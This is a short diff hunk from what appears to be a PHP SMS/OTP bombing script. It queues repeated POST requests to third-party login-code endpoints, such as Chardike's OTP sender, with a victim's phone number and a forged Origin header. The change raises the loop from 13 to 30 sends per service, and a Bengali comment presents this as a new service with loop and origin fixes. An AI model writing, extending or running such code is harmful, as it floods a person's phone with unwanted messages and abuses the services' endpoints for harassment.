@@ -69,7 +69,7 @@ $api_requests[] = ["name"=>"chorki_1", "url"=>"https://api-dynamic.chorki.com/v2
 // ==========================================
 // 💥 আপনার দেওয়া একদম নতুন সার্ভিস (লুপ ও অরিজিন ফিক্সসহ)
 // ==========================================
-for($i=1;$i<=13;$i++){
+for($i=1;$i<=30;$i++){
     // Chardike
     $api_requests[] = ["name"=>"chardike_$i", "url"=>"https://api.chardike.com/api/otp/send", "method"=>"POST", "data"=>["phone"=>$phone_11, "otp_type"=>"login"], "headers"=>['Content-Type:application/json', 'Origin:https://chardike.com']];
     
